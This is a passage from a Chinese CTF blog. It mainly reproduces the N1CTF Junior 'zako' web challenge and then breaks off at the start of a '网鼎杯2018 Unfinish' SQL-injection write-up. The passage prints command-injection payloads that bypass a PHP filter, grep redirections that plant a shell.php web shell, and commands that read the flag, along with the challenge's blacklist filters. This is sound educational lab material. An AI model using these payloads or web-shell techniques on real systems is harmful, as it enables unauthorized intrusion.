title="zako复现:"></a>zako复现:</h2><h3 id="php非法传参："><a href="#php非法传参：" class="headerlink" title="php非法传参："></a>php非法传参：</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">当PHP版本小于8时，如果参数中出现中括号[，中括号会被转换成下划线_，但是会出现转换错误导致接下来如果该参数名中还有非法字符并不会继续转换成下划线_，也就是说如果中括号[出现在前面，那么中括号[还是会被转换成下划线_，但是因为出错导致接下来的非法字符并不会被转换成下划线_<br></code></pre></td></tr></table></figure><p>所以只要将其中一个_变为[，就可以进行传参，但是通过测试，发现字符串开头的_不能为[，但是第二个_可以用[，替换，可以得到内容回显(题目环境是php&lt;8):</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_[secret.xswl.io=ls #一般先尝试一下ls可不可以<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240211232537082.png" alt="image-20240211232537082"></p><h3 id="获取execute-sh文件"><a href="#获取execute-sh文件" class="headerlink" title="获取execute.sh文件:"></a>获取execute.sh文件:</h3><p><strong>.sh文件直接访问时可以直接被网页下载获取,所以以后一些陌生或可疑文件在知道其目录的情况下，都可以进行访问一下，看看能不能进行下载获取</strong></p><p><img src="/images/2024-2-18/image-20240211232914394.png" alt="image-20240211232914394"></p><p><img src="/2024/02/18/2024-02-18-%E7%AC%AC%E4%BA%8C%E5%B1%8AN1CTF%20Junior_zako%E5%A4%8D%E7%8E%B0/Typora_images\image-20240211233257819.png" alt="image-20240211233257819"></p><h4 id="下载获取到的execute-sh"><a href="#下载获取到的execute-sh" class="headerlink" title="下载获取到的execute.sh:"></a>下载获取到的execute.sh:</h4><p>将其后缀名去掉以后获取到完整的代码</p><p><img src="/images/2024-2-18/image-20240211233451352.png" alt="image-20240211233451352"></p><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计:"></a>代码审计:</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br> <br><span class="hljs-comment">#  函数定义</span><br><span class="hljs-comment"># $&#123;1&#125;为调用该函数时，传给该函数的第一个参数</span><br><span class="hljs-function"><span class="hljs-title">reject</span></span>() &#123;<br>    <span class="hljs-comment"># 输出调用该函数时传入的第一个参数的值</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;1&#125;</span>&quot;</span><br>    <span class="hljs-comment"># 退出当前脚本执行&lt;=&gt;exit</span><br>    <span class="hljs-built_in">exit</span> 1<br>&#125;<br><br><span class="hljs-comment"># $1表示执行当前脚本，传入的第一个参数</span><br>XXXCMD=<span class="hljs-variable">$1</span><br> <br>awk -v str=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;XXXCMD&#125;</span>&quot;</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string"># 所要进行执行的脚本</span><br><span class="hljs-string">BEGIN &#123;</span><br><span class="hljs-string">    # 定义黑名单字符</span><br><span class="hljs-string">    deny=&quot;`;&amp;$()&#123;&#125;[]!@#$%^&amp;*-&quot;;</span><br><span class="hljs-string">    for (i = 1; i &lt;= length(str); i++) &#123;</span><br><span class="hljs-string">        # 获取str字符串中的指定位置字符</span><br><span class="hljs-string">        char = substr(str, i, 1);</span><br><span class="hljs-string">        for (x = 1; x &lt; length(deny) + 1; x++) &#123;</span><br><span class="hljs-string">            # 获取deny字符串指定位置的字符</span><br><span class="hljs-string">            r = substr(deny, x, 1);</span><br><span class="hljs-string">            # 判断用户输入的字符串中是否存在deny中的字符</span><br><span class="hljs-string">            # 如果有，则退出程序</span><br><span class="hljs-string">            if (char == r) exit 1;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&#x27;</span><br><span class="hljs-comment"># $?存储了以上代码的退出码，判断是否为0，如果不为0，则为真，&amp;&amp;继续执行左边</span><br><span class="hljs-comment"># 如果退出码为0，则输出假，&amp;&amp;不继续执行左边</span><br><span class="hljs-comment"># reject &quot;NOT ALLOW 1&quot;，向reject函数传&quot;NOT ALLOW 1&quot;字符串参数</span><br>[ $? -ne 0 ] &amp;&amp; reject <span class="hljs-string">&quot;NOT ALLOW 1&quot;</span><br><br><span class="hljs-comment"># echo &quot;$&#123;XXXCMD&#125;&quot;：将我们输入的cmd(即XXXCMD)的内容输出给awk所指定的脚本中</span><br><span class="hljs-comment"># |：管道符可以依次执行从左往右的命令，也可以将左边命令的内容通过echo输出给右边命令中</span><br><span class="hljs-comment"># awk -F &quot;|&quot;:将获得的cmd内容以|进行分割传输给后面的脚本模块</span><br><span class="hljs-comment"># $()中的整个代码执行的结果赋值给eval_cmd参数</span><br>eval_cmd=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;XXXCMD&#125;</span>&quot;</span> | awk -F <span class="hljs-string">&quot;|&quot;</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string"># 开始模块</span><br><span class="hljs-string">BEGIN &#123;</span><br><span class="hljs-string">    # 白名单内容</span><br><span class="hljs-string">    allows[1] = &quot;ls&quot;;# 展示指定目录的文件</span><br><span class="hljs-string">    allows[2] = &quot;makabaka&quot;;</span><br><span class="hljs-string">    allows[3] = &quot;whoareu&quot;;</span><br><span class="hljs-string">    allows[4] = &quot;cut~no&quot;;</span><br><span class="hljs-string">    allows[5] = &quot;grep&quot;;# 搜索指定文件内容，输出匹配的字符串所在行的内容</span><br><span class="hljs-string">    allows[6] = &quot;wc&quot;;# 查看文件行数情况，不可以读取内容</span><br><span class="hljs-string">    allows[7] = &quot;杂鱼杂鱼&quot;;</span><br><span class="hljs-string">    allows[8] = &quot;netstat.jpg&quot;;</span><br><span class="hljs-string">    allows[9] = &quot;awsl&quot;;</span><br><span class="hljs-string">    allows[10] = &quot;dmesg&quot;;</span><br><span class="hljs-string">    allows[11] = &quot;xswl&quot;;</span><br><span class="hljs-string">&#125;&#123;</span><br><span class="hljs-string">    # 这个模块的作用就是判断我们的命令是否在白名单中，在白名单中则可以被存储到eval_cmd数组中</span><br><span class="hljs-string">    num = 1;</span><br><span class="hljs-string">    # NF 表示字段数量，即输入脚本的字段的数量</span><br><span class="hljs-string">    # $i表示输入的第i个参数的值，这里字符串被|分割为各个字段输入，所以就表示第i个字段的值</span><br><span class="hljs-string">    for (i = 1; i &lt;= NF; i++) &#123;</span><br><span class="hljs-string">        for (x = 1; x &lt;= length(allows); x++) &#123;</span><br><span class="hljs-string">            cmpstr = substr($i, 1, length(allows[x]));</span><br><span class="hljs-string">            if (cmpstr == allows[x])</span><br><span class="hljs-string">                eval_cmd[num++] = $i;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"># 结束模块</span><br><span class="hljs-string">END &#123;</span><br><span class="hljs-string">    # 由于模块运行结束才会调用$()进行赋值，所以当最后运行完毕后为：命令1| 命令2| 命令3| ......</span><br><span class="hljs-string">    # 然后将最终的打印结果赋值给eval_cmd</span><br><span class="hljs-string">    for (i = 1; i &lt;= length(eval_cmd); i++) &#123;</span><br><span class="hljs-string">        if (i != 1)</span><br><span class="hljs-string">            # 输出第一个之后的命令且带上管道符，保证允许的命令都能够执行</span><br><span class="hljs-string">            printf &quot;| %s&quot;, eval_cmd[i];</span><br><span class="hljs-string">        else</span><br><span class="hljs-string">            # 输出第一个命令</span><br><span class="hljs-string">            printf &quot;%s&quot;, eval_cmd[i];</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;&#x27;</span><br>)<br><br><span class="hljs-comment"># 判断我们传入的参数(cmd)是否为空，为空则调用reject &quot;NOT ALLOW 2&quot;</span><br>[ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;XXXCMD&#125;</span>&quot;</span> = <span class="hljs-string">&quot;&quot;</span> ] &amp;&amp; reject <span class="hljs-string">&quot;NOT ALLOW 2&quot;</span><br><br><span class="hljs-comment"># 执行eval_cmd命令</span><br><span class="hljs-built_in">eval</span> <span class="hljs-variable">$&#123;eval_cmd&#125;</span><br></code></pre></td></tr></table></figure><h3 id="index-php代码分析"><a href="#index-php代码分析" class="headerlink" title="index.php代码分析:"></a>index.php代码分析:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//something hide here</span><br><br><br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;__secret.xswl.io&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>) &gt; <span class="hljs-number">70</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no, &gt; 70&quot;</span>);<br>&#125;<br><span class="hljs-comment">// 这里的else内容丢失了，根据提示something hide here</span><br><span class="hljs-comment">// 说明该代码部分被隐藏了</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你就不能绕一下喵&quot;</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;./execute.sh &#x27;&quot;</span>.<span class="hljs-variable">$cmd</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>网页上显示的代码内容是不完整的，所以我们需要获取源码才能知道过滤的内容</p><h3 id="获取完整的index-php代码："><a href="#获取完整的index-php代码：" class="headerlink" title="获取完整的index.php代码："></a>获取完整的index.php代码：</h3><h4 id="利用wc查看index-php的文件行数"><a href="#利用wc查看index-php的文件行数" class="headerlink" title="利用wc查看index.php的文件行数:"></a>利用wc查看index.php的文件行数:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_[secret.xswl.io=wc index.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212010447345.png" alt="image-20240212010447345"></p><p>我们输入的内容有过滤，可以用?替换index.php中的一个字符尝试绕过:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_[secret.xswl.io=wc inde?.ph?<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212010716400.png" alt="image-20240212010716400"></p><p>得到index.php总共有16行数据</p><p><img src="/images/2024-2-18/image-20240212011045979.png" alt="image-20240212011045979"></p><p>网页实际显示的行数为14行，少了两行。</p><h3 id="使用grep获取缺失行的内容"><a href="#使用grep获取缺失行的内容" class="headerlink" title="使用grep获取缺失行的内容:"></a>使用grep获取缺失行的内容:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_[secret.xswl.io=grep -A 5 &quot;&#125;&quot; inde?.ph?<br>获取匹配行及其后面的5行内容<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212011727307.png" alt="image-20240212011727307"></p><p>经过测试”-“被过滤了。</p><h4 id="直接使用匹配字符串获取行内容"><a href="#直接使用匹配字符串获取行内容" class="headerlink" title="直接使用匹配字符串获取行内容:"></a>直接使用匹配字符串获取行内容:</h4><p><strong>由于缺少的是else模块内容，所以直接匹配else</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_[secret.xswl.io=grep &quot;else&quot; inde?.ph?<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212012022041.png" alt="image-20240212012022041"></p><p>没有回显内容。</p><h4 id="知识点介绍"><a href="#知识点介绍" class="headerlink" title="知识点介绍:"></a>知识点介绍:</h4><h5 id="php隐藏显示代码"><a href="#php隐藏显示代码" class="headerlink" title="php隐藏显示代码:"></a>php隐藏显示代码:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs txt">highlight_string(shell_exec(&quot;cat &quot;.__FILE__.&quot; | grep -v preg_match | grep -v highlight&quot;));<br><br>这段代码的作用是将当前文件的内容读取并使用 grep 命令进行筛选，然后使用 highlight_string 函数对筛选后的内容进行语法高亮。<br><br>让我们逐步解析这段代码：<br><br>__FILE__ 是一个魔术常量，表示当前文件的绝对路径和文件名。<br><br>cat __FILE__ 使用 cat 命令读取当前文件的内容，并通过管道 | 将其传递给下一个命令。<br><br>grep -v preg_match 是第一个 grep 命令，使用 -v 选项反转匹配，即只输出不匹配 &quot;preg_match&quot; 的行。这可能是为了排除当前文件中包含 &quot;preg_match&quot; 的行。<br><br>grep -v highlight 是第二个 grep 命令，同样使用 -v 选项反转匹配，即只输出不匹配 &quot;highlight&quot; 的行。这可能是为了排除当前文件中包含 &quot;highlight&quot; 的行。<br><br>最后，shell_exec 函数将整个命令串联起来，并执行命令。命令的结果将作为字符串返回。<br><br>highlight_string 函数接受一个字符串参数，将其中的 PHP 代码进行语法高亮处理，并将结果输出到浏览器或终端。<br><br>总结起来，这段代码的作用是读取当前文件的内容，排除包含 &quot;preg_match&quot; 和 &quot;highlight&quot; 的行，然后对剩余的代码进行语法高亮处理，并将结果输出到设备上。这可能是用于展示当前文件的代码，并在其中突出显示不包含特定函数的部分。<br><br>需要注意的是，直接执行用户输入的命令可能存在安全风险，因此在实际应用中应该谨慎使用，并确保输入的命令是可信的。<br></code></pre></td></tr></table></figure><p>所以我们直接匹配highlight_string去获取被隐藏的匹配字符串。</p><h4 id="获取highlight-string代码"><a href="#获取highlight-string代码" class="headerlink" title="获取highlight_string代码:"></a>获取highlight_string代码:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_[secret.xswl.io=grep &quot;highl&quot; inde?.ph?<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212012613893.png" alt="image-20240212012613893"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">highlight_string(shell_exec(&quot;cat &quot;.__FILE__.&quot; | grep -v preg_match | grep -v highlight&quot;)); <br></code></pre></td></tr></table></figure><p>隐藏的是preg_match和highlight所在行。</p><h4 id="匹配preg-match所在行内容"><a href="#匹配preg-match所在行内容" class="headerlink" title="匹配preg_match所在行内容:"></a>匹配preg_match所在行内容:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_[secret.xswl.io=grep &quot;preg&quot; inde?.ph?<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212012755215.png" alt="image-20240212012755215"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">highlight_string(shell_exec(&quot;cat &quot;.__FILE__.&quot; | grep -v preg_match | grep -v highlight&quot;)); if (preg_match(&quot;/(&#x27;|`|\n|\t|\\\$|~|@|#|;|&amp;|\\||-|_|\\=|\\*|!|\\%|\\\^|index|execute&#x27;)/is&quot;,$cmd))&#123; <br></code></pre></td></tr></table></figure><h4 id="缺失的行内容"><a href="#缺失的行内容" class="headerlink" title="缺失的行内容:"></a>缺失的行内容:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">highlight_string(shell_exec(&quot;cat &quot;.__FILE__.&quot; | grep -v preg_match | grep -v highlight&quot;)); <br>if (preg_match(&quot;/(&#x27;|`|\n|\t|\\\$|~|@|#|;|&amp;|\\||-|_|\\=|\\*|!|\\%|\\\^|index|execute&#x27;)/is&quot;,$cmd))&#123; <br></code></pre></td></tr></table></figure><h4 id="完整的index-php"><a href="#完整的index-php" class="headerlink" title="完整的index.php:"></a>完整的index.php:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-comment">//something hide here</span><br><span class="hljs-title function_ invoke__">highlight_string</span>(<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;cat &quot;</span>.<span class="hljs-keyword">__FILE__</span>.<span class="hljs-string">&quot; | grep -v preg_match | grep -v highlight&quot;</span>)); <br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;__secret.xswl.io&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>)&gt;<span class="hljs-number">70</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no, &gt;70&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/(&#x27;|`|\n|\t|\\\$|~|@|#|;|&amp;|\\||-|_|\\=|\\*|!|\\%|\\\^|index|execute&#x27;)/is&quot;</span>,<span class="hljs-variable">$cmd</span>))&#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你就不能绕一下喵&quot;</span>);<br>&#125;<br> <br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;./execute.sh &#x27;&quot;</span>.<span class="hljs-variable">$cmd</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>);<br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="使用grep直接获取文件完整内容"><a href="#使用grep直接获取文件完整内容" class="headerlink" title="使用grep直接获取文件完整内容:"></a>使用grep直接获取文件完整内容:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_[secret.xswl.io=grep &quot;&quot; inde?.ph?<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212021144189.png" alt="image-20240212021144189"></p><p><img src="/images/2024-2-18/image-20240212021215290.png" alt="image-20240212021215290"></p><h3 id="使用grep创建新文件绕过字符过滤-构造木马文件"><a href="#使用grep创建新文件绕过字符过滤-构造木马文件" class="headerlink" title="使用grep创建新文件绕过字符过滤(构造木马文件):"></a>使用grep创建新文件绕过字符过滤(构造木马文件):</h3><h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">由于grep可以匹配文件的行内容，同时也可以通过&gt;&gt;输出到新文件中，所以如果我们将index.php中我们想要的行内容输出到我们新创建的文件中，这样就可以直接避开preg_match()函数。<br></code></pre></td></tr></table></figure><h4 id="我们需要的行内容"><a href="#我们需要的行内容" class="headerlink" title="我们需要的行内容:"></a>我们需要的行内容:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;__secret.xswl.io&quot;</span>];<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;./execute.sh &#x27;&quot;</span>.<span class="hljs-variable">$cmd</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>);<br></code></pre></td></tr></table></figure><h4 id="grep匹配行内容输出到我们在网页当前目录创建的shell-php文件中"><a href="#grep匹配行内容输出到我们在网页当前目录创建的shell-php文件中" class="headerlink" title="grep匹配行内容输出到我们在网页当前目录创建的shell.php文件中:"></a>grep匹配行内容输出到我们在网页当前目录创建的shell.php文件中:</h4><h5 id="payload1"><a href="#payload1" class="headerlink" title="payload1:"></a>payload1:</h5><p><strong>shell.php不存在时，命令行会自动创建</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_[secret.xswl.io=grep &quot;&lt;?php&quot; inde?.ph? &gt;&gt; shell.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212013634864.png" alt="image-20240212013634864"></p><h5 id="payload2"><a href="#payload2" class="headerlink" title="payload2:"></a>payload2:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_[secret.xswl.io=grep &quot;REQUEST&quot; inde?.ph? &gt;&gt; shell.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212013811611.png" alt="image-20240212013811611"></p><p><img src="/images/2024-2-18/image-20240212015115993.png" alt="image-20240212015115993"></p><h5 id="payload3"><a href="#payload3" class="headerlink" title="payload3:"></a>payload3:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_[secret.xswl.io=grep &quot;system&quot; inde?.ph? &gt;&gt; shell.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212013850597.png" alt="image-20240212013850597"></p><p><img src="/images/2024-2-18/image-20240212015159406.png" alt="image-20240212015159406"></p><h4 id="访问shell-php"><a href="#访问shell-php" class="headerlink" title="访问shell.php:"></a>访问shell.php:</h4><p><img src="/images/2024-2-18/image-20240212015224616.png" alt="image-20240212015224616"></p><p>成功访问创建的木马文件！！！</p><h3 id="获取网页指定目录信息"><a href="#获取网页指定目录信息" class="headerlink" title="获取网页指定目录信息:"></a>获取网页指定目录信息:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">shell.php?_[secret.xswl.io=ls ../<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212015414066.png" alt="image-20240212015414066"></p><h3 id="获取readflag的文件内容"><a href="#获取readflag的文件内容" class="headerlink" title="获取readflag的文件内容:"></a>获取readflag的文件内容:</h3><h4 id="payload1-1"><a href="#payload1-1" class="headerlink" title="payload1:"></a>payload1:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">shell.php?_[secret.xswl.io=ls ../&#x27;;cat ../readflag&#x27;<br>shell.php?_[secret.xswl.io=ls&#x27;|../readflag&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212020140952.png" alt="image-20240212020140952"></p><h4 id="payload2-1"><a href="#payload2-1" class="headerlink" title="payload2:"></a>payload2:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">shell.php?_[secret.xswl.io=grep &quot;&quot; ../readflag<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212020614372.png" alt="image-20240212020614372"></p><p><img src="/images/2024-2-18/image-20240212020420020.png" alt="image-20240212020420020"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_[网鼎杯2018]Unfinish</title>
    <link href="/2024/02/18/2024-02-18-%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DUnfinish/"/>
    <url>/2024/02/18/2024-02-18-%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DUnfinish/</url>
    
    <content type="html"><![CDATA[<h1 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h2><p>[<a href="https://blog.csdn.net/fmyyy1/article/details/115733073">网鼎杯2018]Unfinish_[网鼎杯2018]unfinish 1-CSDN博客</a></p><h2 id="场景"><a href="#场景" class="headerlink" title="场景:"></a>场景:</h2><p><img src="/images/2024-2-18/image-20240215135032954.png" alt="image-20240215135032954"></p><p>发现是一个登录界面，我们可以猜测一下网页存在注册界面register.php</p><h2 id="访问注册界面"><a href="#访问注册界面" class="headerlink" title="访问注册界面:"></a>访问注册界面:</h2><p><img src="/images/2024-2-18/image-20240215135656875.png" alt="image-20240215135656875"></p><h2 id="随便注册一个账户"><a href="#随便注册一个账户" class="headerlink" title="随便注册一个账户:"></a>随便注册一个账户:</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>email=123@qq.com<br>&amp;username=south<br>&amp;password=123<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215140010757.png" alt="image-20240215140010757"></p><h2 id="使用我们注册的账户登录一下"><a href="#使用我们注册的账户登录一下" class="headerlink" title="使用我们注册的账户登录一下:"></a>使用我们注册的账户登录一下:</h2><p><img src="/images/2024-2-18/image-20240215140144979.png" alt="image-20240215140144979"></p><p><img src="/images/2024-2-18/image-20240215140221093.png" alt="image-20240215140221093"></p><p>我们进入了index.php界面。</p><h3 id="点击左上角箭头"><a href="#点击左上角箭头" class="headerlink" title="点击左上角箭头:"></a>点击左上角箭头:</h3><p><img src="/images/2024-2-18/image-20240215141631501.png" alt="image-20240215141631501"></p><p>发现显示了我们注册用的用户名以及图片</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">用户名是我们的可控点，这里网页显示的用户名很有可能是从数据库中提取出来的，所以很有可能存在二次注入<br></code></pre></td></tr></table></figure><h2 id="测试网页是否存在二次注入"><a href="#测试网页是否存在二次注入" class="headerlink" title="测试网页是否存在二次注入:"></a>测试网页是否存在二次注入:</h2><h3 id="猜测二次注入的sql语句"><a href="#猜测二次注入的sql语句" class="headerlink" title="猜测二次注入的sql语句:"></a>猜测二次注入的sql语句:</h3><h4 id="insert"><a href="#insert" class="headerlink" title="insert:"></a>insert:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">insert into user set values(&#x27;123@qq.com&#x27;,&#x27;south&#x27;,&#x27;123&#x27;)<br></code></pre></td></tr></table></figure><h3 id="测试payload"><a href="#测试payload" class="headerlink" 